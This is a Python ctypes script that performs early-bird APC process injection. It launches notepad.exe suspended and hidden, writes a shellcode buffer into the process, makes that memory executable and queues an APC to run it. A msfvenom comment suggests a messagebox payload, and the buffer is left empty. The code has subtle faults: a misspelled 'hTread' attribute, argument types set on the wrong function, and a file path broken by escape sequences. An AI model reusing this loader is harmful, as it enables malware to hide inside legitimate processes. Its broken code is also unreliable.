from ctypes import *
from ctypes import wintypes
import subprocess


kernell32 = windll.kernel32
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)


VirtualAllocEx = kernell32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD,wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WritePrcessMemory = kernell32.WriteProcessMemory
WritePrcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID, SIZE_T, POINTER(SIZE_T))
WritePrcessMemory.restype = wintypes.BOOL

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength',wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]
    

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernell32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE,LPSECURITY_ATTRIBUTES, SIZE_T,LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0X00001000
MEM_RESERVE = 0X00002000
PAGE_READWRITE = 0X04
EXECUTE_IMMEDIATELY = 0X0 
PROCESS_ALL_ACCESS = (0X000F0000 | 0x00100000 | 0x00000FFF)

VirtuallProtectEx = kernell32.VirtualProtectEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtuallProtectEx.restype = wintypes.BOOL

class STARTUPINFO(Structure):
  	_fields_ = [
	("cb", wintypes.DWORD),
	("lpReserved",LPTSTR),
	("lpDesktop", LPTSTR),
	("lpTitle", LPTSTR),
	("dwX", wintypes.DWORD),
	("dxY", wintypes.DWORD),
	("dwXSize", wintypes.DWORD),
	("dwYSize", wintypes.DWORD),
	("dwXCountChars", wintypes.DWORD),
	("dwYCountChars", wintypes.DWORD),
	("dwFillAttribute", wintypes.DWORD),
	("dwFlags", wintypes.DWORD),
	("wShowWindow", wintypes.WORD),
	("cbReserved2", wintypes.WORD),
	("lpReserved2", LPBYTE),
	("hStdInput", wintypes.HANDLE),
	("hStdOutput", wintypes.HANDLE),
	("hStdError", wintypes.HANDLE),
	]


class PROCESS_INFORMATION(Structure):
      _fields_ = [
	("hProcess", wintypes.HANDLE),
	("hThread", wintypes.HANDLE),
	("dwProcessId", wintypes.DWORD),
	("dwThreadId", wintypes.DWORD),
	]


CreateProcessA = kernell32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID,wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

#msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
buf = ""

def verify(x):
      if not x:
         raise WinError()

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)

startup_info.dwFlags = 1
startup_info.wShowWindow = 1

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\System32\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW , None, None, byref(startup_info), byref(process_info))

verify(created)

pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hTread

print("Started process => Handle:{}, PID:{}, TID:{}".format(h_process,pid, thread_id))

remote_memory = VirtualAllocEx(h_process,False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory allocated => ", hex(remote_memory))

write = WritePrcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("Bytes Written => {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20
old_protection = wintypes.DWORD(0)
protect = VirtuallProtectEx(h_process, remote_memory, len(buf),PAGE_EXECUTE_READ, byref(old_protection))
verify(protect)
print("Memory protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

#rthread = CreateRemoteThread(h_process, None, 0, remote_memory,None, EXECUTE_IMMEDIATELY, None)
#verify(rthread)

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernell32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE,POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernell32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC thread => {}".format(h_thread))

rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming thread!")



